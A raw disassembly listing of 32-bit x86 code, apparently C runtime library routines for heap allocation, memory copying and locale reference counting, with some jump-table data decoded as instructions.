  425dbe:	pop    ecx
  425dbf:	mov    esi,eax
  425dc1:	mov    DWORD PTR [ebp-0x20],esi
  425dc4:	cmp    esi,edi
  425dc6:	je     0x425e47
  425dc8:	push   DWORD PTR [ebp+0x8]
  425dcb:	call   0x425b96
  425dd0:	pop    ecx
  425dd1:	mov    DWORD PTR [ebp-0x1c],eax
  425dd4:	cmp    eax,edi
  425dd6:	jne    0x425e47
  425dd8:	mov    DWORD PTR [esi],edi
  425dda:	mov    eax,ds:0x4675e4
  425ddf:	mov    DWORD PTR [esi+0x4],eax
  425de2:	mov    eax,ds:0x4674dc
  425de7:	mov    DWORD PTR [esi+0x8],eax
  425dea:	mov    eax,ds:0x4674d4
  425def:	mov    DWORD PTR [esi+0xc],eax
  425df2:	xor    eax,eax
  425df4:	mov    DWORD PTR [ebp-0x24],eax
  425df7:	cmp    eax,0x5
  425dfa:	jge    0x425e0c
  425dfc:	mov    cx,WORD PTR [eax*2+0x4675f0]
  425e04:	mov    WORD PTR [esi+eax*2+0x10],cx
  425e09:	inc    eax
  425e0a:	jmp    0x425df4
  425e0c:	xor    eax,eax
  425e0e:	mov    DWORD PTR [ebp-0x24],eax
  425e11:	cmp    eax,0x101
  425e16:	jge    0x425e25
  425e18:	mov    cl,BYTE PTR [eax+0x4674e0]
  425e1e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425e22:	inc    eax
  425e23:	jmp    0x425e0e
  425e25:	xor    eax,eax
  425e27:	mov    DWORD PTR [ebp-0x24],eax
  425e2a:	cmp    eax,0x100
  425e2f:	jge    0x425e41
  425e31:	mov    cl,BYTE PTR [eax+0x467600]
  425e37:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425e3e:	inc    eax
  425e3f:	jmp    0x425e27
  425e41:	mov    DWORD PTR ds:0x4674d8,esi
  425e47:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425e4b:	jne    0x425e61
  425e4d:	cmp    esi,DWORD PTR ds:0x4674d8
  425e53:	je     0x425e61
  425e55:	push   esi
  425e56:	call   0x425e9a
  425e5b:	pop    ecx
  425e5c:	jmp    0x425e61
  425e5e:	mov    DWORD PTR [ebp-0x1c],edi
  425e61:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e65:	call   0x425e73
  425e6a:	mov    eax,DWORD PTR [ebp-0x1c]
  425e6d:	call   0x4252cb
  425e72:	ret    
  425e73:	push   0xd
  425e75:	call   0x4253bb
  425e7a:	pop    ecx
  425e7b:	ret    
  425e7c:	cmp    DWORD PTR ds:0x46782c,0x0
  425e83:	jne    0x425e97
  425e85:	push   0xfffffffd
  425e87:	call   0x425d2c
  425e8c:	pop    ecx
  425e8d:	mov    DWORD PTR ds:0x46782c,0x1
  425e97:	xor    eax,eax
  425e99:	ret    
  425e9a:	push   0xc
  425e9c:	push   0x4295c0
  425ea1:	call   0x425290
  425ea6:	mov    esi,DWORD PTR [ebp+0x8]
  425ea9:	test   esi,esi
  425eab:	je     0x425f05
  425ead:	cmp    DWORD PTR ds:0x467704,0x3
  425eb4:	jne    0x425ef6
  425eb6:	push   0x4
  425eb8:	call   0x42544f
  425ebd:	pop    ecx
  425ebe:	and    DWORD PTR [ebp-0x4],0x0
  425ec2:	push   esi
  425ec3:	call   0x426672
  425ec8:	pop    ecx
  425ec9:	mov    DWORD PTR [ebp-0x1c],eax
  425ecc:	test   eax,eax
  425ece:	je     0x425ed9
  425ed0:	push   esi
  425ed1:	push   eax
  425ed2:	call   0x42669d
  425ed7:	pop    ecx
  425ed8:	pop    ecx
  425ed9:	or     DWORD PTR [ebp-0x4],0xffffffff
  425edd:	call   0x425eed
  425ee2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ee6:	jne    0x425f05
  425ee8:	push   DWORD PTR [ebp+0x8]
  425eeb:	jmp    0x425ef7
  425eed:	push   0x4
  425eef:	call   0x4253bb
  425ef4:	pop    ecx
  425ef5:	ret    
  425ef6:	push   esi
  425ef7:	push   0x0
  425ef9:	push   DWORD PTR ds:0x467700
  425eff:	call   DWORD PTR ds:0x429058
  425f05:	call   0x4252cb
  425f0a:	ret    
  425f0b:	push   0xc
  425f0d:	push   0x4295d0
  425f12:	call   0x425290
  425f17:	mov    esi,DWORD PTR [ebp+0x8]
  425f1a:	cmp    DWORD PTR ds:0x467704,0x3
  425f21:	jne    0x425f51
  425f23:	cmp    esi,DWORD PTR ds:0x4674c4
  425f29:	ja     0x425f51
  425f2b:	push   0x4
  425f2d:	call   0x42544f
  425f32:	pop    ecx
  425f33:	and    DWORD PTR [ebp-0x4],0x0
  425f37:	push   esi
  425f38:	call   0x426e51
  425f3d:	pop    ecx
  425f3e:	mov    DWORD PTR [ebp-0x1c],eax
  425f41:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f45:	call   0x425f7d
  425f4a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f4d:	test   eax,eax
  425f4f:	jne    0x425f74
  425f51:	test   esi,esi
  425f53:	jne    0x425f56
  425f55:	inc    esi
  425f56:	cmp    DWORD PTR ds:0x467704,0x1
  425f5d:	je     0x425f65
  425f5f:	add    esi,0xf
  425f62:	and    esi,0xfffffff0
  425f65:	push   esi
  425f66:	push   0x0
  425f68:	push   DWORD PTR ds:0x467700
  425f6e:	call   DWORD PTR ds:0x4290dc
  425f74:	call   0x4252cb
  425f79:	ret    
  425f7a:	mov    esi,DWORD PTR [ebp+0x8]
  425f7d:	push   0x4
  425f7f:	call   0x4253bb
  425f84:	pop    ecx
  425f85:	ret    
  425f86:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  425f8b:	ja     0x425faf
  425f8d:	push   DWORD PTR [esp+0x4]
  425f91:	call   0x425f0b
  425f96:	test   eax,eax
  425f98:	pop    ecx
  425f99:	jne    0x425fb1
  425f9b:	cmp    DWORD PTR [esp+0x8],eax
  425f9f:	je     0x425fb1
  425fa1:	push   DWORD PTR [esp+0x4]
  425fa5:	call   0x427b72
  425faa:	test   eax,eax
  425fac:	pop    ecx
  425fad:	jne    0x425f8d
  425faf:	xor    eax,eax
  425fb1:	ret    
  425fb2:	push   DWORD PTR ds:0x467388
  425fb8:	push   DWORD PTR [esp+0x8]
  425fbc:	call   0x425f86
  425fc1:	pop    ecx
  425fc2:	pop    ecx
  425fc3:	ret    
  425fc4:	int3   
  425fc5:	int3   
  425fc6:	int3   
  425fc7:	int3   
  425fc8:	int3   
  425fc9:	int3   
  425fca:	int3   
  425fcb:	int3   
  425fcc:	int3   
  425fcd:	int3   
  425fce:	int3   
  425fcf:	int3   
  425fd0:	push   ebp
  425fd1:	mov    ebp,esp
  425fd3:	push   edi
  425fd4:	push   esi
  425fd5:	mov    esi,DWORD PTR [ebp+0xc]
  425fd8:	mov    ecx,DWORD PTR [ebp+0x10]
  425fdb:	mov    edi,DWORD PTR [ebp+0x8]
  425fde:	mov    eax,ecx
  425fe0:	mov    edx,ecx
  425fe2:	add    eax,esi
  425fe4:	cmp    edi,esi
  425fe6:	jbe    0x425ff0
  425fe8:	cmp    edi,eax
  425fea:	jb     0x42616c
  425ff0:	test   edi,0x3
  425ff6:	jne    0x42600c
  425ff8:	shr    ecx,0x2
  425ffb:	and    edx,0x3
  425ffe:	cmp    ecx,0x8
  426001:	jb     0x42602c
  426003:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jmp    DWORD PTR [edx*4+0x42611c]
  42600c:	mov    eax,edi
  42600e:	mov    edx,0x3
  426013:	sub    ecx,0x4
  426016:	jb     0x426024
  426018:	and    eax,0x3
  42601b:	add    ecx,eax
  42601d:	jmp    DWORD PTR [eax*4+0x426030]
  426024:	jmp    DWORD PTR [ecx*4+0x42612c]
  42602b:	nop
  42602c:	jmp    DWORD PTR [ecx*4+0x4260b0]
  426033:	nop
  426034:	inc    eax
  426035:	pusha  
  426036:	inc    edx
  426037:	add    BYTE PTR [eax+eiz*2+0x42],ch
  42603b:	add    BYTE PTR [eax+0x23004260],dl
  426041:	ror    DWORD PTR [edx-0x75f877fa],1
  426047:	inc    esi
  426048:	add    DWORD PTR [eax+0x468a0147],ecx
  42604e:	add    al,cl
  426050:	jmp    0x289e857
  426055:	add    esi,0x3
  426058:	add    edi,0x3
  42605b:	cmp    ecx,0x8
  42605e:	jb     0x42602c
  426060:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426062:	jmp    DWORD PTR [edx*4+0x42611c]
  426069:	lea    ecx,[ecx+0x0]
  42606c:	and    edx,ecx
  42606e:	mov    al,BYTE PTR [esi]
  426070:	mov    BYTE PTR [edi],al
  426072:	mov    al,BYTE PTR [esi+0x1]
  426075:	shr    ecx,0x2
  426078:	mov    BYTE PTR [edi+0x1],al
  42607b:	add    esi,0x2
  42607e:	add    edi,0x2
  426081:	cmp    ecx,0x8
  426084:	jb     0x42602c
  426086:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426088:	jmp    DWORD PTR [edx*4+0x42611c]
  42608f:	nop
  426090:	and    edx,ecx
  426092:	mov    al,BYTE PTR [esi]
  426094:	mov    BYTE PTR [edi],al
  426096:	add    esi,0x1
  426099:	shr    ecx,0x2
  42609c:	add    edi,0x1
  42609f:	cmp    ecx,0x8
  4260a2:	jb     0x42602c
  4260a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260a6:	jmp    DWORD PTR [edx*4+0x42611c]
  4260ad:	lea    ecx,[ecx+0x0]
  4260b0:	adc    esp,DWORD PTR [ecx+0x42]
  4260b3:	add    BYTE PTR [eax],al
  4260b5:	popa   
  4260b6:	inc    edx
  4260b7:	add    al,bh
  4260b9:	pusha  
  4260ba:	inc    edx
  4260bb:	add    al,dh
  4260bd:	pusha  
  4260be:	inc    edx
  4260bf:	add    al,ch
  4260c1:	pusha  
  4260c2:	inc    edx
  4260c3:	add    al,ah
  4260c5:	pusha  
  4260c6:	inc    edx
  4260c7:	add    al,bl
  4260c9:	pusha  
  4260ca:	inc    edx
  4260cb:	add    al,dl
  4260cd:	pusha  
  4260ce:	inc    edx
  4260cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4260d5:	inc    esp
  4260d6:	(bad)  
  4260d7:	in     al,0x8b
  4260d9:	inc    esp
  4260da:	mov    gs,eax
  4260dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4260e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4260e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4260e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4260ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4260f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4260f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4260f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4260fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426100:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426104:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426108:	lea    eax,[ecx*4+0x0]
  42610f:	add    esi,eax
  426111:	add    edi,eax
  426113:	jmp    DWORD PTR [edx*4+0x42611c]
  42611a:	mov    edi,edi
  42611c:	sub    al,0x61
  42611e:	inc    edx
  42611f:	add    BYTE PTR [ecx+eiz*2],dh
  426122:	inc    edx
  426123:	add    BYTE PTR [eax+0x61],al
  426126:	inc    edx
  426127:	add    BYTE PTR [ecx+eiz*2+0x42],dl
  42612b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426131:	leave  
  426132:	ret    
  426133:	nop
  426134:	mov    al,BYTE PTR [esi]
  426136:	mov    BYTE PTR [edi],al
  426138:	mov    eax,DWORD PTR [ebp+0x8]
  42613b:	pop    esi
  42613c:	pop    edi
  42613d:	leave  
  42613e:	ret    
  42613f:	nop
  426140:	mov    al,BYTE PTR [esi]
  426142:	mov    BYTE PTR [edi],al
  426144:	mov    al,BYTE PTR [esi+0x1]
  426147:	mov    BYTE PTR [edi+0x1],al
  42614a:	mov    eax,DWORD PTR [ebp+0x8]
  42614d:	pop    esi
  42614e:	pop    edi
  42614f:	leave  
  426150:	ret    
  426151:	lea    ecx,[ecx+0x0]
  426154:	mov    al,BYTE PTR [esi]
  426156:	mov    BYTE PTR [edi],al
  426158:	mov    al,BYTE PTR [esi+0x1]
  42615b:	mov    BYTE PTR [edi+0x1],al
  42615e:	mov    al,BYTE PTR [esi+0x2]
  426161:	mov    BYTE PTR [edi+0x2],al
  426164:	mov    eax,DWORD PTR [ebp+0x8]
  426167:	pop    esi
  426168:	pop    edi
  426169:	leave  
  42616a:	ret    
  42616b:	nop
  42616c:	lea    esi,[ecx+esi*1-0x4]
  426170:	lea    edi,[ecx+edi*1-0x4]
  426174:	test   edi,0x3
  42617a:	jne    0x4261a0
  42617c:	shr    ecx,0x2
  42617f:	and    edx,0x3
  426182:	cmp    ecx,0x8
  426185:	jb     0x426194
  426187:	std    
  426188:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618a:	cld    
  42618b:	jmp    DWORD PTR [edx*4+0x4262b8]
  426192:	mov    edi,edi
  426194:	neg    ecx
  426196:	jmp    DWORD PTR [ecx*4+0x426268]
  42619d:	lea    ecx,[ecx+0x0]
  4261a0:	mov    eax,edi
  4261a2:	mov    edx,0x3
  4261a7:	cmp    ecx,0x4
  4261aa:	jb     0x4261b8
  4261ac:	and    eax,0x3
  4261af:	sub    ecx,eax
  4261b1:	jmp    DWORD PTR [eax*4+0x4261bc]
  4261b8:	jmp    DWORD PTR [ecx*4+0x4262b8]
  4261bf:	nop
  4261c0:	int3   
  4261c1:	popa   
  4261c2:	inc    edx
  4261c3:	add    al,dh
  4261c5:	popa   
  4261c6:	inc    edx
  4261c7:	add    BYTE PTR [eax],bl
  4261c9:	bound  eax,QWORD PTR [edx+0x0]
  4261cc:	mov    al,BYTE PTR [esi+0x3]
  4261cf:	and    edx,ecx
  4261d1:	mov    BYTE PTR [edi+0x3],al
  4261d4:	sub    esi,0x1
  4261d7:	shr    ecx,0x2
  4261da:	sub    edi,0x1
  4261dd:	cmp    ecx,0x8
  4261e0:	jb     0x426194
  4261e2:	std    
  4261e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	cld    
  4261e6:	jmp    DWORD PTR [edx*4+0x4262b8]
  4261ed:	lea    ecx,[ecx+0x0]
  4261f0:	mov    al,BYTE PTR [esi+0x3]
  4261f3:	and    edx,ecx
  4261f5:	mov    BYTE PTR [edi+0x3],al
  4261f8:	mov    al,BYTE PTR [esi+0x2]
  4261fb:	shr    ecx,0x2
  4261fe:	mov    BYTE PTR [edi+0x2],al
  426201:	sub    esi,0x2
  426204:	sub    edi,0x2
  426207:	cmp    ecx,0x8
  42620a:	jb     0x426194
  42620c:	std    
  42620d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42620f:	cld    
  426210:	jmp    DWORD PTR [edx*4+0x4262b8]
  426217:	nop
  426218:	mov    al,BYTE PTR [esi+0x3]
  42621b:	and    edx,ecx
  42621d:	mov    BYTE PTR [edi+0x3],al
  426220:	mov    al,BYTE PTR [esi+0x2]
  426223:	mov    BYTE PTR [edi+0x2],al
  426226:	mov    al,BYTE PTR [esi+0x1]
  426229:	shr    ecx,0x2
  42622c:	mov    BYTE PTR [edi+0x1],al
  42622f:	sub    esi,0x3
  426232:	sub    edi,0x3
  426235:	cmp    ecx,0x8
  426238:	jb     0x426194
  42623e:	std    
  42623f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426241:	cld    
  426242:	jmp    DWORD PTR [edx*4+0x4262b8]
  426249:	lea    ecx,[ecx+0x0]
  42624c:	ins    BYTE PTR es:[edi],dx
  42624d:	bound  eax,QWORD PTR [edx+0x0]
  426250:	je     0x4262b4
  426252:	inc    edx
  426253:	add    BYTE PTR [edx+eiz*2+0x42],bh
  426257:	add    BYTE PTR [edx+eiz*2+0x628c0042],al
  42625e:	inc    edx
  42625f:	add    BYTE PTR [edx+eiz*2+0x629c0042],dl
  426266:	inc    edx
  426267:	add    BYTE PTR [edi-0x74ffbd9e],ch
  42626d:	inc    esp
  42626e:	mov    ds,WORD PTR [ecx+ecx*4]
  426271:	inc    esp
  426272:	(bad)  
  426273:	sbb    al,0x8b
  426275:	inc    esp
  426276:	mov    ds,WORD PTR [eax]
  426278:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42627c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426280:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426284:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426288:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42628c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426290:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426294:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426298:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42629c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4262a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4262a4:	lea    eax,[ecx*4+0x0]
  4262ab:	add    esi,eax
  4262ad:	add    edi,eax
  4262af:	jmp    DWORD PTR [edx*4+0x4262b8]
  4262b6:	mov    edi,edi
  4262b8:	enter  0x4262,0x0
  4262bc:	shl    BYTE PTR [edx+0x42],1
  4262bf:	add    al,ah
  4262c1:	bound  eax,QWORD PTR [edx+0x0]
  4262c4:	hlt    
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	mov    eax,DWORD PTR [ebp+0x8]
  4262cb:	pop    esi
  4262cc:	pop    edi
  4262cd:	leave  
  4262ce:	ret    
  4262cf:	nop
  4262d0:	mov    al,BYTE PTR [esi+0x3]
  4262d3:	mov    BYTE PTR [edi+0x3],al
  4262d6:	mov    eax,DWORD PTR [ebp+0x8]
  4262d9:	pop    esi
  4262da:	pop    edi
  4262db:	leave  
  4262dc:	ret    
  4262dd:	lea    ecx,[ecx+0x0]
  4262e0:	mov    al,BYTE PTR [esi+0x3]
  4262e3:	mov    BYTE PTR [edi+0x3],al
  4262e6:	mov    al,BYTE PTR [esi+0x2]
  4262e9:	mov    BYTE PTR [edi+0x2],al
  4262ec:	mov    eax,DWORD PTR [ebp+0x8]
  4262ef:	pop    esi
  4262f0:	pop    edi
  4262f1:	leave  
  4262f2:	ret    
  4262f3:	nop
  4262f4:	mov    al,BYTE PTR [esi+0x3]
  4262f7:	mov    BYTE PTR [edi+0x3],al
  4262fa:	mov    al,BYTE PTR [esi+0x2]
  4262fd:	mov    BYTE PTR [edi+0x2],al
  426300:	mov    al,BYTE PTR [esi+0x1]
  426303:	mov    BYTE PTR [edi+0x1],al
  426306:	mov    eax,DWORD PTR [ebp+0x8]
  426309:	pop    esi
  42630a:	pop    edi
  42630b:	leave  
  42630c:	ret    
  42630d:	push   DWORD PTR [esp+0x4]
  426311:	call   DWORD PTR ds:0x4290e0
  426317:	xor    eax,eax
  426319:	inc    eax
  42631a:	ret    0x8
  42631d:	push   0x10
  42631f:	push   0x429618
  426324:	call   0x425290
  426329:	mov    eax,ds:0x467348
  42632e:	test   eax,eax
  426330:	jne    0x426369
  426332:	cmp    DWORD PTR ds:0x467084,0x1
  426339:	je     0x42635f
  42633b:	push   0x429604
  426340:	call   DWORD PTR ds:0x429044
  426346:	test   eax,eax
  426348:	je     0x42635f
  42634a:	push   0x4295dc
  42634f:	push   eax
  426350:	call   DWORD PTR ds:0x429048
  426356:	mov    ds:0x467348,eax
  42635b:	test   eax,eax
  42635d:	jne    0x426369
  42635f:	mov    eax,0x42630d
  426364:	mov    ds:0x467348,eax
  426369:	and    DWORD PTR [ebp-0x4],0x0
  42636d:	push   DWORD PTR [ebp+0xc]
  426370:	push   DWORD PTR [ebp+0x8]
  426373:	call   eax
  426375:	mov    DWORD PTR [ebp-0x1c],eax
  426378:	jmp    0x42639e
  42637a:	mov    eax,DWORD PTR [ebp-0x14]
  42637d:	mov    eax,DWORD PTR [eax]
  42637f:	mov    eax,DWORD PTR [eax]
  426381:	mov    DWORD PTR [ebp-0x20],eax
  426384:	xor    eax,eax
  426386:	inc    eax
  426387:	ret    
  426388:	mov    esp,DWORD PTR [ebp-0x18]
  42638b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426392:	jne    0x42639c
  426394:	push   0x8
  426396:	call   DWORD PTR ds:0x4290b0
  42639c:	xor    eax,eax
  42639e:	or     DWORD PTR [ebp-0x4],0xffffffff
  4263a2:	call   0x4252cb
  4263a7:	ret    
  4263a8:	push   0x10
  4263aa:	push   0x429628
  4263af:	call   0x425290
  4263b4:	mov    esi,DWORD PTR [ebp+0x8]
  4263b7:	imul   esi,DWORD PTR [ebp+0xc]
  4263bb:	mov    DWORD PTR [ebp-0x1c],esi
  4263be:	test   esi,esi
  4263c0:	jne    0x4263c3
  4263c2:	inc    esi
  4263c3:	xor    edi,edi
  4263c5:	mov    DWORD PTR [ebp-0x20],edi
  4263c8:	cmp    esi,0xffffffe0
  4263cb:	ja     0x426432
  4263cd:	cmp    DWORD PTR ds:0x467704,0x3
  4263d4:	jne    0x42641d
  4263d6:	add    esi,0xf
  4263d9:	and    esi,0xfffffff0
  4263dc:	mov    DWORD PTR [ebp+0xc],esi
  4263df:	mov    ebx,DWORD PTR [ebp-0x1c]
  4263e2:	cmp    ebx,DWORD PTR ds:0x4674c4
  4263e8:	ja     0x42641d
  4263ea:	push   0x4
  4263ec:	call   0x42544f
  4263f1:	pop    ecx
  4263f2:	and    DWORD PTR [ebp-0x4],edi
  4263f5:	push   ebx
  4263f6:	call   0x426e51
  4263fb:	pop    ecx
  4263fc:	mov    DWORD PTR [ebp-0x20],eax
  4263ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  426403:	call   0x426452
  426408:	mov    edi,DWORD PTR [ebp-0x20]
  42640b:	test   edi,edi
  42640d:	je     0x426421
  42640f:	push   DWORD PTR [ebp-0x1c]
  426412:	push   0x0
  426414:	push   edi
  426415:	call   0x427b90
  42641a:	add    esp,0xc
  42641d:	test   edi,edi
  42641f:	jne    0x42645b
  426421:	push   esi
  426422:	push   0x8
  426424:	push   DWORD PTR ds:0x467700
  42642a:	call   DWORD PTR ds:0x4290dc
  426430:	mov    edi,eax
  426432:	test   edi,edi
  426434:	jne    0x42645b
  426436:	cmp    DWORD PTR ds:0x467388,edi
  42643c:	je     0x42645b
  42643e:	push   esi
  42643f:	call   0x427b72
  426444:	pop    ecx
  426445:	test   eax,eax
  426447:	jne    0x4263c3
  42644d:	jmp    0x42645d
  42644f:	mov    esi,DWORD PTR [ebp+0xc]
  426452:	push   0x4
  426454:	call   0x4253bb
  426459:	pop    ecx
  42645a:	ret    
  42645b:	mov    eax,edi
  42645d:	call   0x4252cb
  426462:	ret    
  426463:	push   esi
  426464:	mov    esi,DWORD PTR [esp+0x8]
  426468:	mov    eax,DWORD PTR [esi+0x3c]
  42646b:	push   edi
  42646c:	xor    edi,edi
  42646e:	cmp    eax,DWORD PTR ds:0x467394
  426474:	je     0x4264d9
  426476:	cmp    eax,edi
  426478:	je     0x4264d9
  42647a:	mov    eax,DWORD PTR [esi+0x2c]
  42647d:	cmp    DWORD PTR [eax],edi
  42647f:	jne    0x4264d9
  426481:	mov    eax,DWORD PTR [esi+0x34]
  426484:	cmp    eax,edi
  426486:	je     0x4264a4
  426488:	cmp    DWORD PTR [eax],edi
  42648a:	jne    0x4264a4
  42648c:	cmp    eax,DWORD PTR ds:0x4674b0
  426492:	je     0x4264a4
  426494:	push   eax
  426495:	call   0x425e9a
  42649a:	push   DWORD PTR [esi+0x3c]
  42649d:	call   0x427ddf
  4264a2:	pop    ecx
  4264a3:	pop    ecx
  4264a4:	mov    eax,DWORD PTR [esi+0x30]
  4264a7:	cmp    eax,edi
  4264a9:	je     0x4264c7
  4264ab:	cmp    DWORD PTR [eax],edi
  4264ad:	jne    0x4264c7
  4264af:	cmp    eax,DWORD PTR ds:0x4674b4
  4264b5:	je     0x4264c7
  4264b7:	push   eax
  4264b8:	call   0x425e9a
  4264bd:	push   DWORD PTR [esi+0x3c]
  4264c0:	call   0x427d80
  4264c5:	pop    ecx
  4264c6:	pop    ecx
  4264c7:	push   DWORD PTR [esi+0x2c]
  4264ca:	call   0x425e9a
  4264cf:	push   DWORD PTR [esi+0x3c]
  4264d2:	call   0x425e9a
  4264d7:	pop    ecx
  4264d8:	pop    ecx
  4264d9:	mov    eax,DWORD PTR [esi+0x40]
  4264dc:	cmp    eax,DWORD PTR ds:0x4674ac
  4264e2:	je     0x4264fc
  4264e4:	cmp    eax,edi
  4264e6:	je     0x4264fc
  4264e8:	cmp    DWORD PTR [eax],edi
  4264ea:	jne    0x4264fc
  4264ec:	push   eax
  4264ed:	call   0x425e9a
  4264f2:	push   DWORD PTR [esi+0x44]
  4264f5:	call   0x425e9a
  4264fa:	pop    ecx
  4264fb:	pop    ecx
  4264fc:	mov    eax,DWORD PTR [esi+0x50]
  4264ff:	cmp    eax,DWORD PTR ds:0x467390
  426505:	je     0x426523
  426507:	cmp    eax,edi
  426509:	je     0x426523
  42650b:	cmp    DWORD PTR [eax+0xb4],edi
  426511:	jne    0x426523
  426513:	push   eax
  426514:	call   0x427bf0
  426519:	push   DWORD PTR [esi+0x50]
  42651c:	call   0x425e9a
  426521:	pop    ecx
  426522:	pop    ecx
  426523:	push   esi
  426524:	call   0x425e9a
  426529:	pop    ecx
  42652a:	pop    edi
  42652b:	pop    esi
  42652c:	ret    
  42652d:	push   esi
  42652e:	call   0x425145
  426533:	mov    esi,eax
  426535:	mov    eax,DWORD PTR [esi+0x64]
  426538:	cmp    eax,DWORD PTR ds:0x466b4c
  42653e:	je     0x4265ea
  426544:	test   eax,eax
  426546:	je     0x426577
  426548:	mov    ecx,DWORD PTR [eax+0x2c]
  42654b:	dec    DWORD PTR [eax]
  42654d:	test   ecx,ecx
  42654f:	je     0x426553
  426551:	dec    DWORD PTR [ecx]
  426553:	mov    ecx,DWORD PTR [eax+0x34]
  426556:	test   ecx,ecx
  426558:	je     0x42655c
  42655a:	dec    DWORD PTR [ecx]
  42655c:	mov    ecx,DWORD PTR [eax+0x30]
  42655f:	test   ecx,ecx
  426561:	je     0x426565
  426563:	dec    DWORD PTR [ecx]
  426565:	mov    ecx,DWORD PTR [eax+0x40]
  426568:	test   ecx,ecx
  42656a:	je     0x42656e
  42656c:	dec    DWORD PTR [ecx]
  42656e:	mov    ecx,DWORD PTR [eax+0x4c]
  426571:	dec    DWORD PTR [ecx+0xb4]
  426577:	mov    ecx,DWORD PTR ds:0x466b4c
  42657d:	mov    DWORD PTR [esi+0x64],ecx
  426580:	mov    ecx,DWORD PTR ds:0x466b4c
  426586:	inc    DWORD PTR [ecx]
  426588:	mov    ecx,DWORD PTR ds:0x466b4c
  42658e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426591:	test   ecx,ecx
  426593:	je     0x426597
  426595:	inc    DWORD PTR [ecx]
  426597:	mov    ecx,DWORD PTR ds:0x466b4c
  42659d:	mov    ecx,DWORD PTR [ecx+0x34]
  4265a0:	test   ecx,ecx
  4265a2:	je     0x4265a6
  4265a4:	inc    DWORD PTR [ecx]
  4265a6:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ac:	mov    ecx,DWORD PTR [ecx+0x30]
  4265af:	test   ecx,ecx
  4265b1:	je     0x4265b5
  4265b3:	inc    DWORD PTR [ecx]
  4265b5:	mov    ecx,DWORD PTR ds:0x466b4c
  4265bb:	mov    ecx,DWORD PTR [ecx+0x40]
  4265be:	test   ecx,ecx
  4265c0:	je     0x4265c4
  4265c2:	inc    DWORD PTR [ecx]
  4265c4:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ca:	mov    ecx,DWORD PTR [ecx+0x4c]
  4265cd:	inc    DWORD PTR [ecx+0xb4]
  4265d3:	test   eax,eax
  4265d5:	je     0x4265ea
  4265d7:	cmp    DWORD PTR [eax],0x0
  4265da:	jne    0x4265ea
  4265dc:	cmp    eax,0x466af8
  4265e1:	je     0x4265ea
  4265e3:	push   eax
  4265e4:	call   0x426463
  4265e9:	pop    ecx
  4265ea:	mov    eax,DWORD PTR [esi+0x64]
  4265ed:	pop    esi
  4265ee:	ret    
  4265ef:	push   0xc
  4265f1:	push   0x4297b8
  4265f6:	call   0x425290
  4265fb:	push   0xc
  4265fd:	call   0x42544f
  426602:	pop    ecx
  426603:	and    DWORD PTR [ebp-0x4],0x0
  426607:	call   0x42652d
  42660c:	mov    DWORD PTR [ebp-0x1c],eax
  42660f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426613:	call   0x426621
  426618:	mov    eax,DWORD PTR [ebp-0x1c]
  42661b:	call   0x4252cb
  426620:	ret    
  426621:	push   0xc
  426623:	call   0x4253bb
  426628:	pop    ecx
  426629:	ret    
  42662a:	push   0x140
  42662f:	push   0x0
  426631:	push   DWORD PTR ds:0x467700
  426637:	call   DWORD PTR ds:0x4290dc
  42663d:	test   eax,eax
  42663f:	mov    ds:0x4674c0,eax
  426644:	jne    0x426647
  426646:	ret    
  426647:	mov    ecx,DWORD PTR [esp+0x4]
  42664b:	and    DWORD PTR ds:0x4674b8,0x0
  426652:	and    DWORD PTR ds:0x4674bc,0x0
  426659:	mov    ds:0x4674c8,eax
  42665e:	xor    eax,eax
  426660:	mov    DWORD PTR ds:0x4674c4,ecx
  426666:	mov    DWORD PTR ds:0x4674cc,0x10
  426670:	inc    eax
  426671:	ret    
  426672:	mov    eax,ds:0x4674bc
  426677:	lea    ecx,[eax+eax*4]
  42667a:	mov    eax,ds:0x4674c0
  42667f:	lea    ecx,[eax+ecx*4]
  426682:	jmp    0x426696
  426684:	mov    edx,DWORD PTR [esp+0x4]
